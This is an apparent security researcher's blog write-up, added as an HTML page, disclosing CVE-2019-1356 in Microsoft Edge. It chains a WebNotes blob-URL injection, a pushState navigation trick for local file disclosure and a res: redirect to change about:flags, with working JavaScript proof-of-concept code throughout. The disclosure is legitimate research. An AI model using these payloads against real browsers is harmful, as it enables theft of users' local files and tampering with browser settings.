@@ -1,0 +1,230 @@
+<!doctype html>
+<html>
+<head>
+	<title>(CVE-2019-1356) Microsoft Edge - Local File Disclosure and Elevation of Privilege</title>
+	<link href="../q.css?q2" rel="stylesheet">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="https://leucosite.com/Edge-Local-File-Disclosure-and-EoP/" />
+<meta name="twitter:title" content="Microsoft Edge - Local File Disclosure and EoP" />
+<meta name="twitter:creator" content="@qab">
+<meta name="twitter:description" content="Stealing local files and changing flags by chaining several bugs" />
+<meta name="twitter:image" content="https://leucosite.com/qimg/Art21.png" />
+<style>.qResize{
+	width:80%;
+	height:80%;
+}
+#qWriteup p{white-space: pre-wrap;}
+	code{background-color:#cccccc;}
+	#qpic{width:500px;}
+	
+#qWriteup img{
+	width:65%;
+}
+
+#qWriteup video{
+	    display: block;
+    text-indent: 40px;
+    border-radius: 7px;
+    margin: 0 auto;
+	width:65%;
+}
+
+#qWriteup{
+
+}
+</style>
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/> 
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+
+</div>
+</div>
+<div id="qWriteup">
+<h1>Microsoft Edge - Local File Disclosure and EoP</h1>
+<br>
+
+<p>     In this write up, I will be covering multiple bugs in the Edge (EdgeHTML) browser. The combination of these bugs will result in two distinct attacks, one being a local file disclosure and the other is an elevation of privilege which is used to change any settings within <code>'about:flags'</code>.
+</p>
+ 
+<h2>Escaping from HTTP to FILE context</h2>
+<p>The first step in this attack is to escape the restrictive HTTP/Web context to something more interesting like local file context. The argument that we can just have a potential victim open an HTML file after downloading is too much of an unusual user action to claim as a realistic scenario.
+
+So I needed a bug that did this without relying on unusual user interaction. Ideally I would achieve this without user interaction but in this case I settled on a bug in WebNotes. It is true the user interaction is high but at least it wont be 'unusual' interaction since WebNotes are part of the Edge browser and commonly used by its users.
+I already <a target="_blank" rel="noopener noreferer" href="https://twitter.com/Qab/status/983987465580089345">reported a bug in WebNotes previously</a> as it was fixed by the time I needed it. Thankfully I found another bug in WebNotes which allowed me to execute Javascript within the local file context.
+
+Let's take a close look at how WebNotes work:
+
+<video loop="" controls=""><source type="video/mp4" src="./webnotes.mp4"></video>
+<br>
+As you can see, a WebNote basically takes a screenshot of the page you are in and allows you to draw on it. Then this WebNote is saved into a local HTML file.
+So when you open a saved WebNote, you are opening a local HTML file. We need to somehow inject our own code within this saved WebNote file in order to build our case.
+
+The generated WebNote HTML file only has two main user inputs it reflects. The title of the page and the URL are the only values in our direct control and the sanitization on them is secure as far as I know.
+
+However, if you notice in the video the current tab gets turned into a special WebNote tab. Let's see if we can get a reference to such a tab and go from there.
+
+<video loop="" controls=""><source type="video/mp4" src="./newtabwebnote.mp4"></video>
+
+Turns out we do keep a reference to a WebNoted tab and so we can affect it in various ways. 
+
+As usual, the <code>'blob:'</code> URI scheme comes to save the day. I've been sitting on an unusual bug in Edge where I am able to navigate top frame to a <code>'blob:'</code> URL. This is explicitly not allowed in Edge and seems like for good reason. So I used this bug to navigate a WebNoted tab to such a blob URL, and to my surprise I found that WebNotes breaks in such a way that it somehow ends up saving the created blobs HTML content within a saved WebNote.
+
+The way I am able to trick Edge into navigating top frame to a blob URL is using the following code:
+
+<a target="_blank" href="./blob.png"><img src="./blob.png"/></a>
+
+The steps to break WebNotes and inject Javascript is as follows:
+<ol>
+  <li>We ask the user to click anywhere so we can open a new tab and save a reference to it
+  <!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">window.onclick=e=&gt;{
+	fer=open(<span style="color: #0000FF">&#39;/1.html&#39;</span>,<span style="color: #0000FF">&#39;qab&#39;</span>);
+
+}
+</pre></div>
+
+  </li>
+  <li>The new tab will contain a page that navigates top frame to a blob URI using the trick described previously</li>
+  <li>The user is instructed to create a WebNote, we detect this by using an onblur event handler which sends a postMessage to the original page indicating WebNote is being created
+  <!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">a=URL.createObjectURL(<span style="color: #000080; font-weight: bold">new</span> Blob([<span style="color: #0000FF">&#39;Create a WebNote and start drawing something.&lt;script&gt;window.onblur=e=&gt;{opener.postMessage(&quot;&quot;,&quot;*&quot;,[]);}&lt;\/script&gt;&#39;</span>],{type:<span style="color: #0000FF">&#39;text/html&#39;</span>}));
+
+history.replaceState(<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;&#39;</span>,a.split(<span style="color: #0000FF">&#39;/&#39;</span>)[<span style="color: #0000FF">3</span>]);
+
+location.protocol=<span style="color: #0000FF">&#39;blob:http:&#39;</span>;
+</pre></div>
+
+  </li>
+  <li>Once the user creates a WebNote, the main page will again redirect the tab (using the reference saved in step 1) to a third page
+  <!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">function</span> step(){
+	<span style="color: #000080; font-weight: bold">if</span>(go){
+	
+	setInterval(<span style="color: #000080; font-weight: bold">function</span>(){
+	fer.close();
+	qmsg.innerHTML=<span style="color: #0000FF">&#39;Now open the saved WebNote.&#39;</span>;
+	},<span style="color: #0000FF">2500</span>);
+	
+	
+	}<span style="color: #000080; font-weight: bold">else</span>{
+		setTimeout(<span style="color: #000080; font-weight: bold">function</span>(){
+	fer=open(<span style="color: #0000FF">&#39;/2.html&#39;</span>,<span style="color: #0000FF">&#39;qab&#39;</span>);
+
+	},<span style="color: #0000FF">2500</span>);
+	go=<span style="color: #000080; font-weight: bold">true</span>;
+	}
+}
+
+
+window.addEventListener(<span style="color: #0000FF">&quot;message&quot;</span>, step, <span style="color: #000080; font-weight: bold">false</span>);
+</pre></div>
+
+  </li>
+  <li>The third page is loaded within the WebNoted tab and immediately turns itself into a new Blob URL, this time containing our injected HTML
+  <!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">a=URL.createObjectURL(<span style="color: #000080; font-weight: bold">new</span> Blob([<span style="color: #a61717; background-color: #e3d2d2">`</span>Now save <span style="color: #000080; font-weight: bold">this</span> WebNote&lt;script&gt;
+<span style="color: #000080; font-weight: bold">if</span>(location.protocol==<span style="color: #0000FF">&#39;file:&#39;</span>){
+
+<span style="color: #008800; font-style: italic">// Code in this block will be executed once the user opens the saved WebNote</span>
+
+}<span style="color: #000080; font-weight: bold">else</span>{
+window.onblur=e=&gt;{opener.postMessage(<span style="color: #0000FF">&quot;&quot;</span>,<span style="color: #0000FF">&quot;*&quot;</span>,[]);}
+}
+&lt;<span style="color: #a61717; background-color: #e3d2d2">\</span>/script&gt;<span style="color: #a61717; background-color: #e3d2d2">`</span>],{type:<span style="color: #0000FF">&#39;text/html&#39;</span>}));
+
+history.replaceState(<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;&#39;</span>,a.split(<span style="color: #0000FF">&#39;/&#39;</span>)[<span style="color: #0000FF">3</span>]);
+
+location.protocol=<span style="color: #0000FF">&#39;blob:http:&#39;</span>;
+</pre></div>
+
+  </li>
+  <li>The user is then instructed to save the WebNote, this is where Edge breaks and instead of saving a screenshot, saves the contents of the constructed Blob</li>
+  <li>Once the user opens the newly created WebNote, our injected code will execute within <code>'file:'</code> URI scheme</li>
+</ol> 
+
+Awesome, we escaped! Now with our new found freedom within <code>'FILE:'</code> context, what else can we do?
+</p>
+<h2>Bypassing File Read Restrictions</h2><p>The location of the WebNote HTML file on disk is a special case when it comes to the local file context. You see, if you open a local HTML file using Edge then that file can access other files located outside of the original working directory. However, the WebNote HTML file is located within Edges application data where temp data is located (print preview documents go there as well).
+Within this application data folder path, Edge does not allow HTML documents loaded within it to reach outside the current working path. This folder is a similar case as the <code>'Downloads'</code> folder, HTML files opened within it do not have access to things outside their working directory. In other words:
+
+<code>'C:\Users\Q\Downloads\malice.html'</code> <b><i>cannot access</i></b> <code>'C:\a\secret.txt'</code>
+and
+<code>'C:\Users\Q\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\User\Default\WebNotes\malice.html'</code> <b><i>cannot</i></b> access <code>'C:\a\secret.txt'</code>
+but
+<code>'C:\Users\Q\projects\mywebsite\createdByMe.html'</code> <b><i>can</i></b> access <code>'C:\a\secret.txt'</code>
+
+I assume that if an HTML file comes directly from the internet then Edge treats it with less a less privilege context than a normal, user created, HTML file. It's sort of like the security with Word/Excel files.
+
+Now, our injected HTML is unfortunately within a restricted file context. So we need to perform yet another escape, thankfully this one was easier than expected. I first noticed that there are no restrictions on the <code>'replaceState'/'pushState'</code> functions. This function is commonly used in one page web applications to simulate a website navigation, using it within the <code>'file:'</code> URI scheme got me the ability to change the path of the HTML document. However, this was not enough. Edge was still smart enough to not get fooled by this alone, so I needed to get a bit creative.
+
+The documents origin is already set somewhere, it does not change when I change the URL only. So I came up with a fun way to trick Edge into believing an opened HTML file is located elsewhere (thus bypassing any restrictions). Here is the code that made it happen:
+
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">setTimeout(<span style="color: #000080; font-weight: bold">function</span>(){
+
+history.pushState(<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;file:///C:/a/fictional-non-existent.html&#39;</span>)
+
+},<span style="color: #0000FF">500</span>);
+setTimeout(<span style="color: #000080; font-weight: bold">function</span>(){
+
+document.write(<span style="color: #0000FF">&quot;&lt;a id=qa href=\&quot;javascript:try{top.fetch(&#39;file:///C:/a/q.txt&#39;,{mode:&#39;no-cors&#39;,credentials:&#39;include&#39;}).then((q)=&gt;{return q.text()}).then((q)=&gt;{alert(escape(q))});}catch(e){}\&quot;&gt;aaaaa&lt;/a&gt;&lt;script&gt;qa.click()&lt;\/script&gt;&quot;</span>)
+history.pushState(<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;file:///C:/a/q.html&#39;</span>);
+history.back();
+
+},<span style="color: #0000FF">1500</span>);
+</pre></div>
+
+A video of it in action for clarity:
+<video loop="" controls=""><source type="video/mp4" src="./lfd.mp4"></video>
+<br>
+Here is the idea behind the navigation trick:
+<ol>
+<li>I first use the <code>'pushState'</code> function to change the URL into a fictional non-existent HTML file thats located in the same folder as our target file</li>
+<li> <code>'pushState'</code> inserts a navigation history whilst <code>'replaceState'</code> replaces the current viewed history page. This is important.</li>
+<li>I use a <code>'document.write'</code> function at this point for good reason, I want to be able to navigate back to this page and see the HTML I wrote using this function. AFAIK it only worked with this particular way of inserting HTML.</li>
+<li>I then perform a second <code>'pushState'</code> call but this time changing the current URL into the target file location</li>
+<li>I execute <code>'history.back()'</code> in order to return to my <code>'document.write'</code> value I created. Only this time, edge is fooled into thinking we are a real HTML file (but it doesn't actually exists)</li>
+<li>Finally, I attempt to read the target file and boom. File has been stolen!</li>
+</ol>
+
+
+</p>
+<h2>Further Elevating Privilege</h2><p>As an added bonus, the navigation trick explained previously could also be used to change any setting within the <code>'about:flags'</code> page of Edge. This is thanks to the fact that the <code>'file:'</code> context can navigate to <code>'res:</code> URLs, we can use a trick used before to inject our navigation trick within the <code>'res:'</code> context.
+
+Here is the code used:
+
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">var</span> qpay=escape<span style="color: #a61717; background-color: #e3d2d2">`</span>history.replaceState(<span style="color: #0000FF">&quot;&quot;</span>,<span style="color: #0000FF">&quot;&quot;</span>,<span style="color: #0000FF">&quot;res://edgehtml.dll/flags.htm&quot;</span>);
+setTimeout(<span style="color: #000080; font-weight: bold">function</span>(){document.write(<span style="color: #0000FF">&#39;&lt;iframe src=&quot;javascript:top.external.SetExperimentalFlag(/F12ContextMenuEntryPoints/.source, false)&quot;&gt;&#39;</span>);
+history.pushState(<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;&#39;</span>,<span style="color: #0000FF">&#39;res://apds.dll/REDIRECT.HTML?target=javascript:123&#39;</span>);history.back();},<span style="color: #0000FF">333</span>);<span style="color: #a61717; background-color: #e3d2d2">`</span>;
+
+location=<span style="color: #0000FF">&quot;res://apds.dll/REDIRECT.HTML?target=javascript:${qpay}&quot;</span>;
+</pre></div>
+
+<ol>
+<li>We construct our JS payload then navigate to <code>'res://apds.dll/REDIRECT.HTML?target=javascript:{payload}'</code> this specific technique I found used <a target="_blank" rel="noopener noreferer" href="https://www.exploit-db.com/exploits/45502">in this Edge exploit</a> which was published by <a href="https://twitter.com/vscoonly">Lokihardt</a></li>
+<li>The payload simply utilizes the same concept as the navigation bug we discussed earlier to elevate privilege and execute <code>'top.external.SetExperimentalFlag(/F12ContextMenuEntryPoints/.source, false)'</code> which changes one of the settings' value in <code>'about:flags'</code></li>
+<li>Elevated privilege achieved!</li>
+</ol>
+
+
+</p>
+<h2>Final PoC and Video</h2><p>Let's bring all of the previous bugs together.
+
+First, the local file disclosure bug chain:
+<video loop="" controls=""><source type="video/mp4" src="./final-lfd.mp4"></video>
+<br>
+Secondly, the elevation of privilege that changes settings:
+<video loop="" controls=""><source type="video/mp4" src="./final-flags.mp4"></video>
+<br>
+
+Finally, original PoC source code that was sent to Microsoft can be <a href="./CVE-2019-1356.zip">downloaded here</a>.
+</p>
+<h3>References</h3>
+<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1356" target="_blank" rel="noopener noreferer">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1356</a>
+
+</div><Br><br>
+</body>
+</html> 
